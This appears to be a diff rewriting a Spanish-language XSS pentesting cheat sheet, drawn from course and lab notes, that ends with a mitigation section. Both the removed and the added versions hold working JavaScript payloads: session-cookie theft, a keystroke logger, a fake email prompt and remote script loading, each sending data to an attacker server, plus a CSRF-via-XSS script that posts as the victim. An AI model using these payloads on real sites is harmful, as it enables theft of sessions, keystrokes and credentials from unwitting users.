@@ -1,137 +1,139 @@
+# Cross-Site Scripting (XSS)
+
+> Referencia rápida para pentesting y auditorías de seguridad web. Orientada a uso en entornos autorizados.
+
 ---
-tags:
-  - Web
-  - Explotacion
-  - XSS
+
+## ¿Qué es?
+
+XSS permite a un atacante inyectar código JavaScript (u otro script) en una página web que luego se ejecuta en el navegador de otros usuarios. El servidor no ejecuta el código — lo ejecuta la víctima sin saberlo.
+
+**Impacto potencial:**
+- Robo de cookies de sesión / tokens JWT
+- Keyloggers en el navegador
+- Redireccionamiento a páginas falsas
+- Acciones automatizadas en nombre del usuario (publicar, comprar, cambiar contraseña…)
+
 ---
 
-# Notas
+## Tipos de XSS
 
-## Validación
+**Reflected (Reflejado)** — El payload viaja en la URL o en la petición y se refleja directamente en la respuesta HTTP. No se almacena; la víctima debe hacer clic en un enlace manipulado.
 
-Para validar si tiene esta vulnerabilidad podemos hacer lo siguiente:
+**Stored (Almacenado)** — El payload se guarda en la base de datos del servidor (comentarios, perfiles, mensajes…) y se ejecuta cada vez que alguien carga esa página. El más peligroso.
+
+**DOM-Based** — El payload se procesa en el lado cliente a través del DOM, sin pasar por el servidor. El código JavaScript de la propia página manipula el DOM de forma insegura.
+
+---
+
+## Detección
+
+El payload más básico para confirmar si un campo es vulnerable:
 
 ```html
 <script>alert("XSS")</script>
 ```
 
-En el caso de que al ejecutarlo muestre la alerta, nos muestra que lo que hemos ingresado funciona por lo que es vulnerable a XSS.
+Si aparece el `alert`, el campo es vulnerable. A partir de ahí, se pueden construir ataques más elaborados.
 
-Con esta vulnerabilidad puedes ejecutar código en la máquina de la victima, puedes hacer lo siguiente:
-- Robar la cookie de sesión
-- Un keylogger
-- Que realice algo en la página como por ejemplo publicar algo
-	- Para ello tenemos que ver que petición se esta ejecutando cuando creas la publicación.
-- etc
+---
 
-## Creación de fichero js
+## Payloads útiles
 
-Lo que podemos hacer es crear un archivo .js para por ejemplo crear un login y robar credenciales.
-Para que el XXS apunte al archivo tendrías que poner lo siguiente:
+### Robo de cookie de sesión
 
-```html
-<script src="http://192.168.1.149/test.js"></script>
-```
-
-Archivo:
-
-```js
-	var email = prompt("Por favor, introduce tu correo electrónico para visualizar el post", "example@example.com");
-	
-	if (email == null || email == ""){
-		alert("Es necesario introducir un correo válido para visualizar el post");
-	}else{
-	   fetch("http://192.168.1.149/email=" + email);
-	}
-```
-
-
-### Keylogger con js
+> Requiere que la cookie **no tenga el flag `HttpOnly`** activado.
 
 ```html
 <script>
-	var k = "";
-	document.onkeypress = function(e){
-		e = e || windows.event;
-		k += e.key;
-		var i = new Image();
-		i.src = "http://192.168.1.149/" + k;
-	};
+    var req = new XMLHttpRequest();
+    req.open('GET', 'http://TU_SERVER/?cookie=' + document.cookie);
+    req.send();
 </script>
 ```
 
+En tu servidor (ej. con `python3 -m http.server`) verás la cookie en los logs de peticiones entrantes.
 
-### Robo de jwt (cookie)
+---
 
-**Para que esto funcione tiene que tener el valor HttpOnly desactivado**
+### Keylogger en el navegador
 
 ```html
 <script>
-	var request = new XMLHttpRequest();
-	request.open('GET', 'http://192.168.1.149/?cookie=' + document.cookie);
-	request.send();
+    var k = "";
+    document.onkeypress = function(e) {
+        e = e || window.event;
+        k += e.key;
+        var i = new Image();
+        i.src = "http://TU_SERVER/" + k;
+    };
 </script>
 ```
 
-### Crear una publicación automatizada
+Cada pulsación de tecla se envía como una petición GET a tu servidor.
 
-Para esto hay que obtener primero el token de la petición que se envía a la hora de realizar la publicación. 
+---
+
+### Cargar un script externo
+
+Si el campo tiene limitación de caracteres o necesitas un payload más complejo, aloja el código en un servidor y cárgalo remotamente:
+
+```html
+<script src="http://TU_SERVER/payload.js"></script>
+```
+
+Esto permite cambiar el payload sin tocar la inyección, y hace el vector más difícil de detectar.
+
+---
+
+### Ejemplo: formulario de phishing con JS externo
+
+Crear el archivo `payload.js` en tu servidor:
 
 ```js
-var domain = "http://localhost:10007/newgossip"
+var email = prompt("Introduce tu correo para continuar:", "ejemplo@correo.com");
+
+if (email !== null && email !== "") {
+    fetch("http://TU_SERVER/log?email=" + email);
+}
+```
+
+Cuando la víctima carga la página infectada, ve un prompt que parece legítimo y sus credenciales llegan a tu servidor.
+
+---
+
+### Acción automatizada (CSRF mediante XSS)
+
+Útil cuando quieres que la víctima ejecute una acción en la aplicación (publicar, votar, modificar datos…) sin que lo sepa. Primero hay que identificar la petición real que realiza esa acción (con Burp Suite o las DevTools del navegador).
+
+```js
+// 1. Obtener el token CSRF de la página
+var domain = "http://TARGET/nueva-publicacion";
 var req1 = new XMLHttpRequest();
-req1.open('GET', domain, false); //False = Asincono para esperar
+req1.open('GET', domain, false); // false = síncrono, espera a tener respuesta
 req1.withCredentials = true;
 req1.send();
 
-var response = req1.responseTest;
 var parser = new DOMParser();
-var doc = parser.parseFromString(response, 'text/html');
+var doc = parser.parseFromString(req1.responseText, 'text/html');
 var token = doc.getElementsByName("_csrf_token")[0].value;
 
-
+// 2. Enviar la acción con el token obtenido
 var req2 = new XMLHttpRequest();
-var data = "title=prueba&subtitle=prueba&text=prueba&_csrf_token=" + token;
-req2.open('POST', 'http://localhost:10007/newgossip', false);
+var data = "title=test&body=test&_csrf_token=" + token;
+req2.open('POST', domain, false);
 req2.withCredentials = true;
 req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 req2.send(data);
-
 ```
 
-# Hack4u
+---
 
-Una vulnerabilidad **XSS** (**Cross-Site Scripting**) es un tipo de vulnerabilidad de seguridad informática que permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento. Esta vulnerabilidad permite al atacante robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales.
+## Mitigación
 
-En esencia, un ataque XSS implica la inserción de código malicioso en una página web vulnerable, que luego se ejecuta en el navegador del usuario que accede a dicha página. El código malicioso puede ser cualquier cosa, desde scripts que redirigen al usuario a otra página, hasta secuencias de comandos que registran pulsaciones de teclas o datos de formularios y los envían a un servidor remoto.
-
-Existen varios tipos de vulnerabilidades XSS, incluyendo las siguientes:
-
-- **Reflejado** (**Reflected**): Este tipo de XSS se produce cuando los datos proporcionados por el usuario **se reflejan en la respuesta** HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario.
-- **Almacenado** (**Stored**): Este tipo de XSS se produce cuando un atacante **es capaz de almacenar código malicioso** en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada vez que se carga la página.
-- **DOM-Based**: Este tipo de XSS se produce cuando el código malicioso **se ejecuta en el navegador del usuario a través del DOM** (Modelo de Objetos del Documento). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.
-
-Los ataques XSS pueden tener graves consecuencias para las empresas y los usuarios individuales. Por esta razón, es esencial que los desarrolladores web implementen medidas de seguridad adecuadas para prevenir vulnerabilidades XSS. Estas medidas pueden incluir la validación de datos de entrada, la eliminación de código HTML peligroso, y la limitación de los permisos de JavaScript en el navegador del usuario.
-
-A continuación, se proporciona el proyecto de Github correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabilidad XSS:
-
-- **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)
-
-
-# Laboratorio
-
-A continuación, se proporciona el proyecto de Github correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabilidad XSS:
-
-- **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)
-
-# Máquinas
-
-## MyExpense
-
-En esta clase, trataremos de resolver una máquina de la plataforma de **Vulnhub** para practicar los ataques XSS.
-
-Vulnhub es una plataforma de seguridad informática que se centra en la creación y distribución de máquinas virtuales vulnerables con el fin de mejorar las habilidades de los profesionales de la seguridad informática. La plataforma proporciona una amplia variedad de máquinas virtuales (VM) que se han configurado para contener vulnerabilidades deliberadas que pueden ser explotadas para aprender y reforzar técnicas de hacking.
-
-A continuación, se proporciona el enlace a la máquina que nos descargamos en esta clase para practicar esta vulnerabilidad:
-
-- **Máquina MyExpense**: [https://www.vulnhub.com/entry/myexpense-1,405/](https://www.vulnhub.com/entry/myexpense-1,405/)
+- **Escapar la salida** — Todo dato que venga del usuario y se muestre en HTML debe ser escapado (`htmlspecialchars()` en PHP, `.textContent` en lugar de `.innerHTML` en JS).
+- **Content Security Policy (CSP)** — Cabecera HTTP que restringe qué scripts puede cargar y ejecutar el navegador.
+- **Flag `HttpOnly` en cookies** — Impide que JavaScript pueda leer las cookies de sesión.
+- **Flag `Secure` en cookies** — Solo se transmiten por HTTPS.
+- **Validación de entrada** — Rechazar en servidor cualquier carácter o etiqueta no esperada. No confiar solo en la validación del lado cliente.
+- **Frameworks modernos** — React, Vue, Angular escapan el contenido automáticamente por defecto. Evitar `dangerouslySetInnerHTML` o `v-html` con datos no confiables.
